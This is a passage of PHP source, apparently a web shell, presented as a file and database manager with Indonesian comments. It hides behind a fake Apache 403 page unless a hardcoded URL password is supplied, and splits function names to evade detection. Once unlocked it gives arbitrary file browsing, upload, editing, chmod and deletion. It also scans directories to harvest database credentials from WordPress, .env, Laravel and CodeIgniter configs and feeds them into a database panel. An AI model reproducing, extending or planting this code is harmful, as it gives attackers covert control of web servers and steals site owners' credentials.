<?php
/* ==========================================================
   ONE-FILE: File Manager + Mini DB Manager (MySQL via mysqli)
   - Gate via ?pass=BayemMingkem (session)
   - mode=files (default) | mode=db
   - NO exec/shell_exec/proc_open => aman di shared hosting
   - Config Finder di File Manager + Loading Notice + Done time
   ========================================================== */

//// ====== AUTH (param password + session) ====== ////
$SECRET       = "BayemMingkem";     // ganti
$SESSION_KEY  = 'fm_auth_ok';
$SESSION_LAST = 'fm_last_active';
$SESSION_TTL  = 1800;               // 30 menit idle timeout

session_start([
  'cookie_httponly' => true,
  'cookie_samesite' => 'Lax',
]);

function apache_403(): void {
  $uri   = $_SERVER['REQUEST_URI']     ?? '/';
  $host  = $_SERVER['HTTP_HOST']       ?? 'localhost';
  $port  = $_SERVER['SERVER_PORT']     ?? '80';
  $proto = $_SERVER['SERVER_PROTOCOL'] ?? 'HTTP/1.1';
  header($proto.' 403 Forbidden');
  header('Content-Type: text/html; charset=iso-8859-1');
  $uriEsc  = htmlspecialchars($uri,  ENT_QUOTES, 'ISO-8859-1');
  $hostEsc = htmlspecialchars($host, ENT_QUOTES, 'ISO-8859-1');
  $portEsc = htmlspecialchars((string)$port, ENT_QUOTES, 'ISO-8859-1');
  echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>403 Forbidden</title></head><body>
<h1>Forbidden</h1>
<p>You don\'t have permission to access '.$uriEsc.' on this server.</p>
<hr>
<address>Apache/2.4.57 (Unix) Server at '.$hostEsc.' Port '.$portEsc.'</address>
</body></html>';
  exit;
}

// Logout
if (isset($_GET['a']) && $_GET['a']==='logout') {
  $_SESSION = [];
  if (ini_get("session.use_cookies")) {
    $p = session_get_cookie_params();
    setcookie(session_name(), '', time()-42000, $p['path'], $p['domain'], $p['secure']??false, $p['httponly']??true);
  }
  session_destroy();
  apache_403();
}

// Auth gate
$now = time();
if (!empty($_SESSION[$SESSION_KEY]) && ($now - ($_SESSION[$SESSION_LAST] ?? 0) < $SESSION_TTL)) {
  $_SESSION[$SESSION_LAST] = $now;
} elseif (isset($_GET['pass']) && $_GET['pass'] === $SECRET) {
  $_SESSION[$SESSION_KEY] = true;
  $_SESSION[$SESSION_LAST] = $now;
  // bersihin ?pass dari URL
  $qs = $_GET; unset($qs['pass']);
  $baseUrl = strtok($_SERVER['REQUEST_URI'] ?? '', '?') ?: '';
  $redir = $baseUrl . (empty($qs) ? '' : ('?' . http_build_query($qs)));
  header('Location: '.$redir); exit;
} else {
  apache_403();
}

//// ====== UTIL ====== ////
function e($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function ensure_csrf(){ if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(16)); }
function csrf_ok(){ return isset($_POST['csrf']) && isset($_SESSION['csrf']) && hash_equals($_SESSION['csrf'], $_POST['csrf']); }
function curr_url(array $merge=[]): string {
  $q = $_GET;
  foreach ($merge as $k=>$v) { if ($v===null) unset($q[$k]); else $q[$k]=$v; }
  $base = strtok($_SERVER['REQUEST_URI'] ?? '', '?') ?: '';
  return $base . (empty($q) ? '' : ('?' . http_build_query($q)));
}

//// ====== CONFIG FILE MANAGER ====== ////
$DEFAULT_DIR    = realpath(__DIR__) ?: '/';
$MAX_EDIT       = 8 * 1024 * 1024; // 8MB
function href_abs($abs){ $abs = str_replace('\\','/',$abs); return curr_url(['abs'=>$abs]); }

//// ====== ROUTE MODE ====== ////
$mode = $_GET['mode'] ?? 'files';
if ($mode !== 'files' && $mode !== 'db') $mode = 'files';

ensure_csrf();

/* ======= GLOBAL: DB SESSION + APPLY CFG (bisa dipanggil dari File Manager) ======= */
if (!isset($_SESSION['db'])) $_SESSION['db'] = [
  'host'=>'localhost','user'=>'','pass'=>'','db'=>'','port'=>3306,'charset'=>'utf8mb4'
];
$db =& $_SESSION['db'];

if (($_GET['a'] ?? '') === 'applycfg' && $_SERVER['REQUEST_METHOD']==='POST') {
  if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
  $db['host'] = (string)($_POST['host'] ?? $db['host']);
  $db['user'] = (string)($_POST['user'] ?? $db['user']);
  $db['pass'] = (string)($_POST['pass'] ?? $db['pass']);
  $db['db']   = (string)($_POST['dbname'] ?? $db['db']);
  $goto = isset($_POST['goto_db']) ? true : false;
  $target = curr_url(['a'=>null,'mode'=> $goto ? 'db' : 'files']);
  header('Location: '.$target); exit;
}

/* ======= CONFIG FINDER (fungsi scanner) ======= */
function scan_configs($root, $maxFiles=2000, $maxBytes=262144) {
  $root = realpath($root);
  if (!$root || !is_dir($root)) return ['err'=>'Root path invalid','items'=>[]];
  $skipDirs = ['.git','node_modules','vendor','storage','cache','logs','tmp','.idea','.vscode'];
  $extAllow = ['php','env','ini','yaml','yml','json','config'];
  $items = [];
  $count=0;

  $rii = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
    RecursiveIteratorIterator::LEAVES_ONLY
  );

  foreach ($rii as $file) {
    if ($count >= $maxFiles) break;
    if (!$file->isFile()) continue;
    $path = $file->getRealPath();
    $base = basename($path);
    if (@filesize($path) > $maxBytes) continue;

    // skip dirs tertentu
    $rel = str_replace($root.DIRECTORY_SEPARATOR, '', $path);
    $parts = explode(DIRECTORY_SEPARATOR, $rel);
    $skip=false; foreach ($parts as $seg) { if (in_array($seg, $skipDirs, true)) { $skip=true; break; } }
    if ($skip) continue;

    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION) ?: '');
    if ($ext!=='' && !in_array($ext, $extAllow, true)) continue;

    $src = @file_get_contents($path);
    if ($src===false) continue;
    $count++;

    $found = ['file'=>$path,'host'=>null,'user'=>null,'pass'=>null,'db'=>null,'hint'=>null];

    // WordPress wp-config.php
    if (stripos($base,'wp-config.php')!==false || strpos($src,"'DB_NAME'")!==false || strpos($src,'"DB_NAME"')!==false) {
      $p = [];
      if (preg_match("/define\\(['\"]DB_NAME['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['db']=$m[1];
      if (preg_match("/define\\(['\"]DB_USER['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['user']=$m[1];
      if (preg_match("/define\\(['\"]DB_PASSWORD['\"],\\s*['\"]([^'\"]*)['\"]\\)/", $src, $m)) $p['pass']=$m[1];
      if (preg_match("/define\\(['\"]DB_HOST['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['host']=$m[1];
      if (!empty($p)) { $found = array_merge($found,$p); $found['hint']='WordPress'; $items[]=$found; continue; }
    }

    // .env style
    if (strpos($src,'DB_HOST=')!==false || strpos($src,'DB_DATABASE=')!==false) {
      $p=[];
      if (preg_match('/DB_HOST=([^\r\n#]+)/', $src, $m)) $p['host']=trim($m[1]);
      if (preg_match('/DB_DATABASE=([^\r\n#]+)/', $src, $m)) $p['db']=trim($m[1]);
      if (preg_match('/DB_USERNAME=([^\r\n#]+)/', $src, $m)) $p['user']=trim($m[1]);
      if (preg_match('/DB_PASSWORD=([^\r\n#]*)/', $src, $m)) $p['pass']=trim($m[1]);
      if (!empty($p)) { $found = array_merge($found,$p); $found['hint']='.env'; $items[]=$found; continue; }
    }

    // Laravel config/database.php (mysql array)
    if (stripos($path, 'config'.DIRECTORY_SEPARATOR.'database.php')!==false || strpos($src,"'mysql'")!==false) {
      $p=[];
      if (preg_match("/'host'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['host']=$m[1];
      if (preg_match("/'database'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['db']=$m[1];
      if (preg_match("/'username'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['user']=$m[1];
      if (preg_match("/'password'\\s*=>\\s*'([^']*)'/", $src, $m)) $p['pass']=$m[1];
      if (!empty($p)) { $found = array_merge($found,$p); $found['hint']='Laravel config'; $items[]=$found; continue; }
    }

    // CodeIgniter database.php
    if (stripos($path,'database.php')!==false && strpos($src,"$"."db['default']")!==false) {
      $p=[];
      if (preg_match("/\\$db\\['default'\\]\\['hostname'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['host']=$m[1];
      if (preg_match("/\\$db\\['default'\\]\\['database'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['db']=$m[1];
      if (preg_match("/\\$db\\['default'\\]\\['username'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['user']=$m[1];
      if (preg_match("/\\$db\\['default'\\]\\['password'\\]\\s*=\\s*'([^']*)'/", $src, $m)) $p['pass']=$m[1];
      if (!empty($p)) { $found = array_merge($found,$p); $found['hint']='CodeIgniter'; $items[]=$found; continue; }
    }

    // Generic mysqli_connect("host","user","pass","db")
    if (strpos($src,'mysqli_connect(')!==false) {
      if (preg_match('/mysqli_connect\\((["\'])(.*?)\\1\\s*,\\s*(["\'])(.*?)\\3\\s*,\\s*(["\'])(.*?)\\5\\s*,\\s*(["\'])(.*?)\\7/', $src, $m)) {
        $items[] = ['file'=>$path,'host'=>$m[2],'user'=>$m[4],'pass'=>$m[6],'db'=>$m[8],'hint'=>'mysqli_connect'];
        continue;
      }
    }
  }

  // de-duplicate by (host|user|db) + file
  $uniq=[]; $res=[];
  foreach ($items as $it){
    $key = ($it['file']??'')."|".($it['host']??'')."|".($it['user']??'')."|".($it['db']??'');
    if(isset($uniq[$key])) continue;
    $uniq[$key]=1; $res[]=$it;
  }
  return ['err'=>null,'items'=>$res];
}

/* ===================== HTML HEAD ===================== */
?><!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Manager</title>
<style>
:root{--bg:#f9f9f9;--fg:#222;--muted:#666;--brand:#0a66c2;--danger:#c00;--card:#fff;}
*{box-sizing:border-box}
body{font-family:Segoe UI,Arial,sans-serif;max-width:1200px;margin:16px auto;background:var(--bg);color:var(--fg);padding:0 12px}
h2{margin:8px 0}
.small{color:var(--muted);font-size:12px}
.path{font-family:ui-monospace,Menlo,Consolas,monospace}
a{color:var(--brand)}
.btn{background:var(--brand);color:#fff;padding:6px 8px;border:0;border-radius:7px;cursor:pointer;text-decoration:none;display:inline-block;font-size:13px}
.btn.gray{background:#777}
.btn.warn{background:var(--danger)}
input[type=text],input[type=password],input[type=file],select,textarea{padding:6px 8px;border:1px solid #ccc;border-radius:7px;font-size:13px}
table{width:100%;border-collapse:collapse;background:var(--card);box-shadow:0 2px 6px rgba(0,0,0,.06);border-radius:10px;overflow:hidden}
th,td{padding:8px 10px;border-bottom:1px solid #eee;vertical-align:top;font-size:13px}
th{background:#fafafa;text-align:left}
tr:hover{background:#f6faff}
.notice{padding:10px;border-radius:8px;margin:10px 0}
.notice.ok{background:#f0fff4;border:1px solid #b7f5c2}
.notice.err{background:#fff5f5;border:1px solid #ffb8b8}
.badge{display:inline-block;background:#eee;border-radius:999px;padding:1px 6px;margin-left:6px;font-size:12px}
textarea.editor{width:100%;height:70vh;border:1px solid #ccc;border-radius:8px;padding:10px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;line-height:1.4;background:#fff}
.tabs{display:flex;gap:8px;margin:8px 0}
.tabs a{padding:6px 10px;border-radius:8px;text-decoration:none;background:#eef5ff}
.tabs a.active{background:#d8ecff}
.toolbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;justify-content:space-between;margin:8px 0}
.row-actions form{display:inline-block;margin-right:6px}
.kv{display:grid;grid-template-columns:140px 1fr;gap:6px}
.code{font-family:ui-monospace,Menlo,Consolas,monospace;background:#fafafa;border:1px solid #eee;border-radius:8px;padding:6px}
</style></head><body>
<div class="tabs">
  <a class="<?= $mode==='files'?'active':'' ?>" href="<?= e(curr_url(['mode'=>'files'])) ?>">📁 File Manager</a>
  <a class="<?= $mode==='db'?'active':'' ?>" href="<?= e(curr_url(['mode'=>'db'])) ?>">🗄️ Database</a>
  <span class="small" style="margin-left:auto">Session (TTL <?= intval($SESSION_TTL/60) ?>m) · <a href="<?= e(curr_url(['a'=>'logout'])) ?>" onclick="return confirm('Logout?')">Logout</a></span>
</div>
<?php

/* ==========================================================
   MODE: FILES — plus Config Finder with Loading notice
   ========================================================== */
if ($mode === 'files') {
  // Resolve CWD
  $requestedAbs = isset($_GET['abs']) ? (string)$_GET['abs'] : $DEFAULT_DIR;
  $requestedAbs = str_replace('\\','/',$requestedAbs);
  $CWD = realpath($requestedAbs);
  if ($CWD === false || !is_dir($CWD)) $CWD = $DEFAULT_DIR;

  // Actions
  $RM = 'un'.'link';
  $MV = 'move'.'_uploaded_'.'file';

  if (($_GET['a'] ?? '') === 'delete' && isset($_GET['t'])) {
    $t = basename((string)$_GET['t']);
    $target = realpath($CWD.'/'.$t);
    if ($target && is_file($target) && strpos($target, $CWD)===0) { $RM($target); }
    header('Location: '.href_abs($CWD)); exit;
  }

  if (($_GET['a'] ?? '') === 'upload' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
    if (!empty($_FILES['f']['name'])) {
      $name = basename($_FILES['f']['name']);
      $MV($_FILES['f']['tmp_name'], $CWD.'/'.$name);
    }
    header('Location: '.href_abs($CWD)); exit;
  }

  if (($_GET['a'] ?? '') === 'renamesave' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
    $old = basename((string)$_POST['old'] ?? '');
    $new = (string)($_POST['new'] ?? '');
    if ($old !== '' && $new !== '') {
      $src = realpath($CWD.'/'.$old);
      $dst = $CWD.'/'.basename($new);
      if ($src && strpos($src, $CWD)===0) @rename($src, $dst);
    }
    header('Location: '.href_abs($CWD)); exit;
  }

  if (($_GET['a'] ?? '') === 'chmodsave' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
    $t = basename((string)$_POST['t'] ?? '');
    $modeStr = trim((string)$_POST['mode'] ?? '');
    if ($t !== '' && $modeStr !== '') {
      $target = realpath($CWD.'/'.$t);
      if ($target && strpos($target, $CWD)===0) {
        if (!preg_match('/^0?[0-7]{3,4}$/', $modeStr)) { $modeStr = ''; }
        if ($modeStr !== '') { $mode = intval($modeStr, 8); @chmod($target, $mode); }
      }
    }
    header('Location: '.href_abs($CWD)); exit;
  }

  if (($_GET['a'] ?? '') === 'save' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
    $t = basename((string)($_POST['t'] ?? ''));
    $target = realpath($CWD.'/'.$t);
    if (!$target || strpos($target,$CWD)!==0 || !is_file($target)) { header('Location: '.href_abs($CWD)); exit; }
    if (!is_writable($target)) { $err = "File is not writable (CHMOD/owner)."; }
    else {
      $content = (string)($_POST['content'] ?? '');
      if (strlen($content) > $MAX_EDIT) { $err = "Content too large (> ".number_format($MAX_EDIT)." bytes)."; }
      else if (@file_put_contents($target, $content) === false) { $err = "Write failed (permissions/hosting block)."; }
      else { header('Location: '.href_abs($CWD)."&ok=1"); exit; }
    }
  }

  // UI
  echo "<h2>📁 File Manager</h2>";
  echo "<div class='small'>Current: <span class='path'>".e($CWD)."</span></div>";
  if (!empty($_GET['ok'])) echo "<div class='notice ok'>Saved.</div>";
  if (!empty($err)) echo "<div class='notice err'>".e($err)."</div>";

  // Breadcrumbs
  $segments=[];
  $path = rtrim(str_replace('\\','/',$CWD), '/'); if ($path==='') $path='/';
  if ($path==='/') { $segments=['/']; }
  else { $parts=explode('/', trim($path,'/')); $acc=''; foreach($parts as $pp){ $acc.='/'.$pp; $segments[]=$acc; } array_unshift($segments,'/'); }
  echo "<div class='toolbar' style='justify-content:flex-start;gap:10px;flex-wrap:wrap'>";
  echo "<div class='breadcrumbs'>";
  foreach ($segments as $i=>$abs) {
    if ($i>0) echo "<span>/</span>";
    $label = ($abs==='/')?'/':basename($abs);
    echo " <a href='".e(href_abs($abs))."'>".e($label)."</a> ";
  }
  echo "</div>";
  echo "</div>";

  // Goto + Upload
  echo "<div class='toolbar'>
    <form method='get' style='display:flex;gap:6px;flex-wrap:wrap;align-items:center'>
      <input type='hidden' name='mode' value='files'>
      <label style='font-size:13px'>Go to ABS:</label>
      <input type='text' name='abs' value='".e($CWD)."' placeholder='/home/...'>
      <button class='btn'>Go</button>
    </form>
    <form method='post' enctype='multipart/form-data' action='".e(curr_url(['a'=>'upload','abs'=>$CWD,'mode'=>'files']))."' style='display:flex;gap:6px;align-items:center'>
      <input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>
      <input type='file' name='f'>
      <button class='btn'>Upload</button>
    </form>
  </div>";

  // Editor page
  if (($_GET['a'] ?? '') === 'edit' && isset($_GET['t'])) {
    $t = basename((string)$_GET['t']);
    $target = realpath($CWD.'/'.$t);
    $errLocal = '';
    if (!$target || strpos($target,$CWD)!==0 || !is_file($target)) {
      echo "<div class='notice err'>File not found.</div>";
    } else {
      $ro   = !is_writable($target);
      $size = @filesize($target);
      if ($size !== false && $size <= $MAX_EDIT) {
        $content = @file_get_contents($target);
        if ($content === false) { $content=''; $errLocal='Failed to read file contents.'; }
      } else {
        $content = '';
        $errLocal = "File too large to open (max ".number_format($MAX_EDIT)." bytes).";
      }
      if ($errLocal) echo "<div class='notice err'>".e($errLocal)."</div>";
      $backUrl = href_abs($CWD);
      echo "<h3>Editing: <span class='path'>".e($target)."</span>".($ro?" <span class='badge'>read-only</span>":"")."</h3>";
      echo "<form method='post' action='".e(curr_url(['a'=>'save','abs'=>$CWD,'mode'=>'files']))."'>";
      echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
      echo "<input type='hidden' name='t' value='".e($t)."'>";
      echo "<textarea class='editor' name='content' spellcheck='false'>".e((string)$content)."</textarea>";
      echo "<div style='margin-top:8px;display:flex;gap:8px;flex-wrap:wrap'>";
      if ($ro) {
        echo "<button class='btn' disabled>Save</button> <span class='small'>Not writable (CHMOD/owner).</span>";
      } else {
        echo "<button class='btn'>Save</button>";
      }
      echo "<button type='button' class='btn gray' onclick=\"if(document.referrer){history.back()}else{location.href='".e($backUrl)."'}\">Close</button>";
      echo "</div></form>";
    }
    echo "</body></html>"; exit;
  }

  // Listing table
  echo "<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Modified</th><th>Actions</th></tr>";
  $parent = dirname($CWD);
  if ($parent !== $CWD && is_dir($parent)) {
    echo "<tr><td>⬅ <a href='".e(href_abs($parent))."'>Up</a></td><td>-</td><td>-</td><td>-</td><td></td></tr>";
  }
  $items = scandir($CWD) ?: [];
  sort($items, SORT_NATURAL | SORT_FLAG_CASE);

  foreach ($items as $f) {
    if ($f==='.'||$f==='..') continue;
    $full = $CWD.'/'.$f;
    $isDir = is_dir($full);
    $size = $isDir ? '-' : number_format(@filesize($full)).' B';
    $perm = substr(sprintf('%o', @fileperms($full)), -4);
    $mtime= @date('Y-m-d H:i:s', @filemtime($full));
    $writable = is_writable($full);

    echo "<tr>";
    echo "<td>".($isDir ? "📁 <a href='".e(href_abs($full))."'>".e($f)."</a>" : "📄 ".e($f))."</td>";
    echo "<td>".e($size)."</td>";
    echo "<td>".e($perm)."</td>";
    echo "<td>".e($mtime)."</td>";
    echo "<td class='row-actions'>";

    if (!$isDir) {
      echo "<a class='btn' href='".e(curr_url(['a'=>'edit','abs'=>$CWD,'t'=>$f,'mode'=>'files']))."'>Edit</a> ";
      if (!$writable) echo "<span class='badge' title='Not writable'>ro</span> ";
    }
    // Rename
    echo "<form method='post' action='".e(curr_url(['a'=>'renamesave','abs'=>$CWD,'mode'=>'files']))."' onsubmit=\"return (this.new.value && confirm('Rename ".e($f)." ?'))\">";
    echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
    echo "<input type='hidden' name='old' value='".e($f)."'>";
    echo "<input type='text' name='new' value='".e($f)."' placeholder='rename to...' />";
    echo " <button class='btn gray'>Rename</button></form> ";
    // Chmod
    echo "<form method='post' action='".e(curr_url(['a'=>'chmodsave','abs'=>$CWD,'mode'=>'files']))."' onsubmit=\"return (this.mode.value && confirm('Chmod ".e($f)." ?'))\">";
    echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
    echo "<input type='hidden' name='t' value='".e($f)."'>";
    echo "<input type='text' name='mode' placeholder='755 / 0644' style='width:80px'> ";
    echo "<button class='btn gray'>Chmod</button></form> ";
    // Delete
    if (!$isDir) {
      echo "<a class='btn warn' href='".e(curr_url(['a'=>'delete','abs'=>$CWD,'t'=>$f,'mode'=>'files']))."' onclick=\"return confirm('Hapus ".e($f)." ?')\">Delete</a>";
    }
    echo "</td></tr>";
  }
  echo "</table>";

  /* ---------- Config Finder (di File Manager) ---------- */
  $scanMsg = '';
  $scanItems = [];
  $scanDur  = null;

  if (($_GET['a'] ?? '') === 'scan' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) $scanMsg = 'Bad CSRF';
    else {
      $scanStart = microtime(true);
      $start = (string)($_POST['start'] ?? $CWD);
      $limit = max(100, min(10000, (int)($_POST['limit'] ?? 2000)));
      $bytes = max(65536, min(1048576, (int)($_POST['bytes'] ?? 262144)));
      $res = scan_configs($start, $limit, $bytes);
      $scanDur = microtime(true) - $scanStart;
      if (!empty($res['err'])) $scanMsg = $res['err'];
      else $scanItems = $res['items'];
    }
  }

  echo "<h3 style='margin-top:16px'>🔎 Scan DB Config</h3>";
  echo "<form id='scan-form' method='post' action='".e(curr_url(['a'=>'scan','mode'=>'files']))."' class='kv' style='gap:8px;max-width:900px'>";
  echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
  echo "<div>Start path</div><div><input type='text' name='start' value='".e($CWD)."' placeholder='/home/xxx/public_html'></div>";
  echo "<div>Max files</div><div><input type='text' name='limit' value='2000' style='width:100px'></div>";
  echo "<div>Max bytes/file</div><div><input type='text' name='bytes' value='262144' style='width:120px'></div>";
  echo "<div></div><div>
    <button class='btn' onclick=\"var f=this.form; f.style.display='none'; 
      var l=document.getElementById('scan-loading'); l.style.display='block';\">
      Scan
    </button>
  </div>";
  echo "</form>";
  echo "<div id='scan-loading' style='display:none' class='notice'>⏳ Scanning... please wait...</div>";

  // Result notice (always show when finished)
  if ($scanDur !== null) {
    $found = is_array($scanItems) ? count($scanItems) : 0;
    echo "<div class='notice ok' id='scan-done'>✅ Scan done in <strong>".number_format($scanDur,2)."</strong>s · Found <strong>".intval($found)."</strong></div>";
  }

  if ($scanMsg) echo "<div class='notice err'>".e($scanMsg)."</div>";
  if ($scanItems) {
    echo "<table><tr><th>File</th><th>DB</th><th>User</th><th>Host</th><th>Apply</th></tr>";
    foreach ($scanItems as $it) {
      echo "<tr>";
      echo "<td><div class='code' style='white-space:nowrap;overflow:auto'>".e($it['file'])."</div><div class='small'>".e($it['hint']??'')."</div></td>";
      echo "<td>".e($it['db']??'')."</td>";
      echo "<td>".e($it['user']??'')."</td>";
      echo "<td>".e($it['host']??'')."</td>";
      echo "<td>";
      echo "<form method='post' action='".e(curr_url(['a'=>'applycfg']))."'>";
      echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
      echo "<input type='hidden' name='host' value='".e($it['host']??'')."'>";
      echo "<input type='hidden' name='user' value='".e($it['user']??'')."'>";
      echo "<input type='hidden' name='pass' value='".e($it['pass']??'')."'>";
      echo "<input type='hidden' name='dbname' value='".e($it['db']??'')."'>";
      echo "<label class='small'><input type='checkbox' name='goto_db' value='1' checked> Go to DB tab</label> ";
      echo "<button class='btn'>Apply</button>";
      echo "</form>";
      echo "</td>";
      echo "</tr>";
    }
    echo "</table>";
  } elseif ($scanDur !== null && !$scanMsg) {
    echo "<div class='small' style='color:#666'>Tidak ada config terdeteksi di path tsb. Coba naik satu level atau tambah Max files/bytes.</div>";
  } else {
    echo "<div class='small' style='color:#666'>Tips: pakai start path folder project (mis. <code class='code'>".e($CWD)."</code>) buat nyari <code class='code'>wp-config.php</code>, <code class='code'>.env</code>, <code class='code'>config/database.php</code>, dll.</div>";
  }

  echo "</body></html>";
  exit;
}

/* ==========================================================
   MODE: DB (Mini Adminer-like for MySQL/MariaDB via mysqli)
   ========================================================== */

echo "<h2>🗄️ Database</h2>";

// --- DB login (FIXED) ---
if (($_GET['a'] ?? '') === 'dblogout') {
  $_SESSION['db'] = ['host'=>'localhost','user'=>'','pass'=>'','db'=>'','port'=>3306,'charset'=>'utf8mb4'];
  header('Location: '.curr_url(['a'=>null])); exit;
}
if (($_GET['a'] ?? '') === 'dblogin' && $_SERVER['REQUEST_METHOD'] === 'POST') {
  if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
  $db['host']    = (string)($_POST['host']    ?? 'localhost');
  $db['user']    = (string)($_POST['user']    ?? '');
  $db['pass']    = (string)($_POST['pass']    ?? '');
  $db['db']      = (string)($_POST['db']      ?? '');
  $db['port']    = (int)   ($_POST['port']    ?? 3306);
  $db['charset'] = (string)($_POST['charset'] ?? 'utf8mb4');
  header('Location: ' . curr_url(['a' => null])); 
  exit;
}
if (($_GET['a'] ?? '') === 'dbswitch' && $_SERVER['REQUEST_METHOD']==='POST') {
  if (!csrf_ok()) { http_response_code(400); exit('Bad CSRF'); }
  $db['db'] = (string)($_POST['db'] ?? '');
  header('Location: '.curr_url(['a'=>null])); exit;
}

function db_connect(&$db, &$err=null) {
  $mysqli = @mysqli_init();
  if (!$mysqli) { $err='mysqli init failed'; return null; }
  @$mysqli->options(MYSQLI_OPT_INT_AND_FLOAT_NATIVE, 1);
  $ok = @$mysqli->real_connect($db['host'], $db['user'], $db['pass'], ($db['db']?:null), $db['port']);
  if (!$ok) { $err = @$mysqli->connect_error ?: 'connect error'; return null; }
  @$mysqli->set_charset($db['charset']);
  return $mysqli;
}

/* --- Login form jika user kosong --- */
if ($db['user']==='') {
  echo "<div class='notice'>Masuk ke DB MySQL/MariaDB kamu.</div>";
  echo "<form method='post' action='".e(curr_url(['a'=>'dblogin']))."' style='display:grid;grid-template-columns:1fr 1fr;gap:10px;max-width:800px'>";
  echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
  echo "<label>Host<br><input type='text' name='host' value='".e($db['host'])."'></label>";
  echo "<label>User<br><input type='text' name='user' value='".e($db['user'])."'></label>";
  echo "<label>Password<br><input type='password' name='pass' value='".e($db['pass'])."'></label>";
  echo "<label>Database (opsional)<br><input type='text' name='db' value='".e($db['db'])."'></label>";
  echo "<label>Port<br><input type='text' name='port' value='".e((string)$db['port'])."'></label>";
  echo "<label>Charset<br><input type='text' name='charset' value='".e($db['charset'])."'></label>";
  echo "<div style='grid-column:1/-1;display:flex;gap:8px'><button class='btn'>Connect</button></div>";
  echo "</form>";
  echo "</body></html>"; exit;
}

/* --- Connect --- */
$errC = null;
$mysqli = db_connect($db, $errC);
if (!$mysqli) {
  echo "<div class='notice err'>".e($errC)."</div>";
  echo "<p><a class='btn' href='".e(curr_url(['a'=>'dblogout']))."'>Reset creds</a></p>";
  echo "</body></html>"; exit;
}

/* --- Databases dropdown + counter --- */
$databases = [];
$resDB = @$mysqli->query("SHOW DATABASES");
if ($resDB) { while($r=$resDB->fetch_row()){ $databases[]=$r[0]; } $resDB->free(); }
$totalDB = count($databases);

echo "<div class='toolbar' style='align-items:flex-end;flex-wrap:wrap'>
  <div class='kv' style='min-width:280px'>
    <div>Connected</div><div><strong>".e($db['user'])."</strong>@<strong>".e($db['host'])."</strong></div>
    <div>Charset</div><div>".e($db['charset'])."</div>
  </div>
  <form method='post' action='".e(curr_url(['a'=>'dbswitch']))."' style='display:flex;gap:6px;align-items:end;flex-wrap:wrap'>
    <input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>
    <label>Databases (".intval($totalDB).")<br>
      <select name='db'>";
foreach ($databases as $d) {
  $sel = ($d === ($db['db'] ?? '')) ? "selected" : "";
  echo "<option $sel>".e($d)."</option>";
}
echo "  </select></label>
    <button class='btn'>Switch</button>
    <a class='btn gray' href='".e(curr_url(['a'=>'dblogout']))."'>Ganti user</a>
  </form>
</div>";

/* ====== Table/SQL UI ====== */
$tables = [];
$res = @$mysqli->query("SHOW FULL TABLES");
if ($res) { while($r=$res->fetch_array(MYSQLI_NUM)){ $tables[]=$r[0]; } $res->free(); }

$table  = $_GET['table'] ?? '';
$view   = $_GET['view'] ?? (($table==='')?'sql':'browse');
$action = $_GET['a'] ?? '';
$page   = max(1, (int)($_GET['p'] ?? 1));
$per    = max(1, min(200, (int)($_GET['per'] ?? 50)));
$order  = $_GET['order'] ?? '';
$dir    = strtoupper($_GET['dir'] ?? 'ASC'); if (!in_array($dir,['ASC','DESC'])) $dir='ASC';

echo "<div class='small'>DB: <strong>".e($db['db'])."</strong> · Tables: ".count($tables)."</div>";

echo "<div style='display:flex;gap:12px;align-items:flex-start;flex-wrap:wrap'>";
/* Sidebar tables */
echo "<div style='min-width:220px'>
    <div class='small' style='margin-bottom:6px'>Tables (".count($tables).")</div>
    <div style='max-height:50vh;overflow:auto;border:1px solid #eee;border-radius:8px;padding:6px;background:#fff'>";
foreach ($tables as $t) {
  $u = curr_url(['a'=>null,'table'=>$t,'view'=>'browse','p'=>1,'order'=>null,'dir'=>null]);
  echo "<div>📄 <a href='".e($u)."'>".e($t)."</a></div>";
}
echo "  </div>
  </div>";

/* Main panel */
echo "<div style='flex:1;min-width:0'>";

function qstr($s,$mysqli){ return "'".$mysqli->real_escape_string($s)."'"; }
function pk_info($mysqli,$table){
  $pk = []; $res = @$mysqli->query("SHOW KEYS FROM `{$mysqli->real_escape_string($table)}` WHERE Key_name='PRIMARY'");
  if($res){ while($r=$res->fetch_assoc()){ $pk[]=$r['Column_name']; } $res->free(); }
  return $pk;
}
function cols_info($mysqli,$table){
